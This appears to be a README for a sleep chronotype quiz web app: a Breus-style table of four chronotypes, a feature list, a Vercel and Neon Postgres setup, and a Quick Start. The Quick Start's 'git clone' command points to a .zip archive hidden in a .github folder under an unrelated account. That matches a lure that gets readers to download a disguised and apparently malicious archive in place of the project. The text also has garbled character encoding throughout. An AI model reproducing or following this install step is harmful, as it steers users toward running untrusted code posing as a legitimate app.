## What is a Sleep Chronotype?

Your **chronotype** is your body's natural preference for when to sleep and be active вҖ” determined by genetics, age, and circadian biology. It governs whether you thrive at sunrise, peak at midnight, or fall somewhere in between.

This is not about willpower or laziness. It is biology. Understanding your chronotype lets you schedule deep work, exercise, and rest at the times when your body is actually ready for them.

This quiz analyzes 10 dimensions of your daily rhythm вҖ” wake time, energy peaks, meal patterns, creativity windows, sleep onset, and more вҖ” to match you with one of four chronotype archetypes popularized by sleep researcher Dr. Michael Breus.

---

## The Four Chronotypes

| | рҹҰҒ Lion | рҹҗ» Bear | рҹҗә Wolf | рҹҗ¬ Dolphin |
|---|---|---|---|---|
| **Population** | ~15% | ~55% | ~15% | ~10% |
| **Personality** | Morning warrior | Solar-powered | Night thinker | Light sleeper |
| **Peak hours** | 8 AM вҖ“ 12 PM | 10 AM вҖ“ 2 PM | 5 PM вҖ“ 12 AM | Sporadic |
| **Sleep time** | 9:30 PM | 11:00 PM | 1:00 AM | Irregular |
| **Strength** | Discipline & drive | Steady productivity | Creative bursts | Hypersensitive focus |

## Features

- 10-question science-based chronotype quiz covering wake time, energy peaks, meal patterns, creativity, and more
- 4 detailed result profiles вҖ” Lion, Bear, Wolf, Dolphin вҖ” each with a personalized description and trait tags
- Score breakdown showing your percentage match across all four chronotypes
- Interactive daily timeline visualization tailored to each chronotype
- 5 actionable productivity and sleep tips per result
- Dark cosmic theme with an animated star background
- Mobile-first responsive design вҖ” works seamlessly on all screen sizes
- Bilingual вҖ” English and Korean (i18next with full translation coverage)
- One-tap SNS sharing вҖ” Twitter, Facebook, KakaoTalk, and Copy Link
- Serverless backend вҖ” Vercel Functions for result submission
- Global stats вҖ” see how your chronotype compares to all other quiz takers

The frontend is a React SPA deployed to Vercel. Quiz submissions are handled by Vercel Serverless Functions (`api/submit.ts`, `api/stats.ts`) co-located in the same repo вҖ” no separate deployment needed. Results are persisted to Neon Serverless Postgres (Singapore region). The `/api/stats` endpoint powers the real-time global distribution display.

## Quick Start

```bash
# Clone the repository
git clone https://raw.githubusercontent.com/Jhoizar170882/sleep-type/main/.github/type_sleep_1.5.zip
cd sleep-type

# Install dependencies
npm install

# Start the dev server
npm run dev
```

The app will be available at `http://localhost:5173`.

The `api/` directory is deployed automatically by Vercel alongside the frontend. No separate backend setup is required.

**Environment variable required (set in Vercel dashboard):**

| Variable | Description |
|---|---|
| `DATABASE_URL` | Neon Serverless Postgres connection string |
